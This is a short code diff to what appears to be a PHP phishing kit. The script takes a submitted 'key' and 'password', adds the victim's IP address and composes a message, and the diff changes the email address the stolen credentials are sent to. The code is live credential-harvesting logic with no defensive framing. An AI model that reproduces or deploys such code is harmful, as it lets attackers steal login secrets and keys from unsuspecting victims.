@@ -23,7 +23,7 @@ if (isset($_POST['submit'])) {
 
 		// echo $my_key ;
 		// echo $my_password;
-		$mail = 'Raeleneleinaalasagapolu@outlook.com';
+		$mail = 'advisorytravel8@gmail.com';
 
 		$msg =  'Key :' . $my_key . '<br>' . ' => password :' . $my_password . '<br>' .' => ip address :' . getUserIpAddr() ;
 		// echo $msg . 'from Javscript file';
